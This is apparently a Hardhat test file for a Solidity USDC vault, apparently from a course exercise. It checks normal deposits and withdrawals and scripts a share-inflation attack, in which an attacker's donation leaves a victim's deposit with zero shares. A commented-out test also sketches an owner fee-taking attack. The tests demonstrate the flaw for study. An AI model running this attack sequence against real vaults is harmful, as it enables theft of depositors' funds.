const { expect } = require("chai");
const { ethers } = require("hardhat");

async function validateVaultState(vaultContract, expectedSharePrice, expectedTotalShares, expectedTotalUnderlyingTokens) {
    let sharePrice, totalShares, totalUnderlyingTokens;
    sharePrice = await vaultContract.getSharePrice();
    expect(ethers.formatUnits(sharePrice, 18).toString()).to.equal(expectedSharePrice);
    totalShares = await vaultContract.getTotalShares();
    expect(totalShares.toString()).to.equal(ethers.parseUnits(expectedTotalShares, 6));
    totalUnderlyingTokens = await vaultContract.getTotalUnderlyingTokens();
    expect(totalUnderlyingTokens.toString()).to.equal(ethers.parseUnits(expectedTotalUnderlyingTokens, 6)); 
}

async function validateUserState(vaultContract, usdc, user, expectedUserShares, expectedUserUnderlyingTokens) {
    userShares = await vaultContract.getUserShares(user);
    expect(userShares.toString()).to.equal(ethers.parseUnits(expectedUserShares, 6));
    userUnderlyingTokens = await usdc.balanceOf(user);
    expect(userUnderlyingTokens.toString()).to.equal(ethers.parseUnits(expectedUserUnderlyingTokens, 6));
}

describe("Vault contract", function () {
    let usdc, vault_contract, vaultContract;
    let vault_owner, alice, bob, carol;

    // it("takeFreeAsOwner can only be provoked by the owner", async function() {

    // });

    it("Part1: Normal Case (Alice, Bob, carol and donator)", async function() {
        [alice, bob, carol, entity] =  await ethers.getSigners(); 
        const MockUSDC = await ethers.getContractFactory("MockUSDC");
        usdc = await MockUSDC.deploy();
        await usdc.mint(alice.address, ethers.parseUnits("100", 6));  
        await usdc.mint(bob.address, ethers.parseUnits("100", 6)); 
        await usdc.mint(carol.address, ethers.parseUnits("75", 6));
        await usdc.mint(entity.address, ethers.parseUnits("100", 6));
        vault_contract = await ethers.getContractFactory("Vault");
        vaultContract = await vault_contract.deploy(usdc.target);
        vault_owner = await vaultContract.owner(); //owner assigned by default

        //Alice deposits 100USDC
        await usdc.connect(alice).approve(vaultContract.target, ethers.parseUnits("100", 6));
        await expect(
            vaultContract.connect(alice).deposit(ethers.parseUnits("100", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "1.0", "100", "100");
        await validateUserState(vaultContract, usdc, alice, "100", "0");

        //Bob deposits 100USDC
        await usdc.connect(bob).approve(vaultContract.target, ethers.parseUnits("100", 6));
        await expect(
            vaultContract.connect(bob).deposit(ethers.parseUnits("100", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "1.0", "200", "200");
        await validateUserState(vaultContract, usdc, bob, "100", "0");
  
        //Entity donates 100USDC
        await usdc.connect(entity).approve(vaultContract.target, ethers.parseUnits("100", 6));
        await expect(
            vaultContract.connect(entity).donate(ethers.parseUnits("100", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "1.5", "200", "300");
        await validateUserState(vaultContract, usdc, entity, "0", "0");

        //Alice withdraws all her shares
        await expect(
            vaultContract.connect(alice).withdraw(ethers.parseUnits("100", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "1.5", "100", "150");
        await validateUserState(vaultContract, usdc, alice, "0", "150");

        //Bob withdraws half of his shares
        await expect(
            vaultContract.connect(bob).withdraw(ethers.parseUnits("50", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "1.5", "50", "75");
        await validateUserState(vaultContract, usdc, bob, "50", "75");

        //Carol deposits 75USDC
        await usdc.connect(carol).approve(vaultContract.target, ethers.parseUnits("75", 6));
        await expect(
            vaultContract.connect(carol).deposit(ethers.parseUnits("75", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "1.5", "100", "150");
        await validateUserState(vaultContract, usdc, carol, "50", "0");
    });

    it("Part2-1: Inflation Attack (Malice and Bob)", async function() {
        [malice, bob] =  await ethers.getSigners(); 
        const MockUSDC = await ethers.getContractFactory("MockUSDC");
        usdc = await MockUSDC.deploy();
        await usdc.mint(malice.address, ethers.parseUnits("20001", 6));  
        await usdc.mint(bob.address, ethers.parseUnits("20000", 6)); 
        vault_contract = await ethers.getContractFactory("Vault");
        vaultContract = await vault_contract.deploy(usdc.target);
        vault_owner = await vaultContract.owner(); //owner assigned by default

        //Malice deposits 1 USDC
        await usdc.connect(malice).approve(vaultContract.target, ethers.parseUnits("1", 6));
        await expect(
            vaultContract.connect(malice).deposit(ethers.parseUnits("1", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "1.0", "1", "1");
        await validateUserState(vaultContract, usdc, malice, "1", "20000");

        //Malice donate(inflate) 20000 USDC
        await usdc.connect(malice).approve(vaultContract.target, ethers.parseUnits("20000", 6));
        await expect(
            vaultContract.connect(malice).donate(ethers.parseUnits("20000", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "20001.0", "1", "20001");
        await validateUserState(vaultContract, usdc, malice, "1", "0");
        
        //Bob deposits 20000 USDC (and get no share)
        await usdc.connect(bob).approve(vaultContract.target, ethers.parseUnits("20000", 6));
        await expect(
            vaultContract.connect(bob).deposit(ethers.parseUnits("20000", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "40001.0", "1", "40001");
        await validateUserState(vaultContract, usdc, bob, "0", "0");

        //Malice burns his 1 share and gets 40001 USDC
        await expect(
            vaultContract.connect(malice).withdraw(ethers.parseUnits("1", 6))
        ).to.not.be.reverted;
        await validateVaultState(vaultContract, "1.0", "0", "0");
        await validateUserState(vaultContract, usdc, malice, "0", "40001");
        await validateUserState(vaultContract, usdc, bob, "0", "0");
    });

    // it("Part2-2: takeFeeAsOwner() Attack (Malice and Owner)", async function() {
    //     [malice] =  await ethers.getSigners(); 
    //     const MockUSDC = await ethers.getContractFactory("MockUSDC");
    //     usdc = await MockUSDC.deploy();
    //     await usdc.mint(malice.address, ethers.parseUnits("1000", 6));  
    //     vault_contract = await ethers.getContractFactory("Vault");
    //     vaultContract = await vault_contract.deploy(usdc.target);
    //     vault_owner = await vaultContract.owner(); //owner assigned by default

    //     //Malice deposits 500 USDC
    //     await usdc.connect(malice).approve(vaultContract.target, ethers.parseUnits("500", 6));
    //     await expect(
    //         vaultContract.connect(malice).deposit(ethers.parseUnits("500", 6))
    //     ).to.not.be.reverted;
    //     await validateVaultState(vaultContract, "1.0", "500", "500");
    //     await validateUserState(vaultContract, usdc, malice, "500", "500");

    //     //Owner takes away 250 USDC
    //     await expect(
    //         vaultContract.connect(vault_owner).takeFeeAsOwner(ethers.parseUnits("250", 6))
    //     ).to.not.be.reverted;
    //     await validateVaultState(vaultContract, "0.5", "500", "250");
    //     await validateUserState(vaultContract, usdc, vault_owner, "0", "250");
        
    //     //Malice deposits 500 USDC
    //     await usdc.connect(malice).approve(vaultContract.target, ethers.parseUnits("500", 6));
    //     await expect(
    //         vaultContract.connect(malice).deposit(ethers.parseUnits("500", 6))
    //     ).to.not.be.reverted;
    //     await validateVaultState(vaultContract, "0.5", "1500", "750");
    //     await validateUserState(vaultContract, usdc, malice, "1500", "0");
    // });
});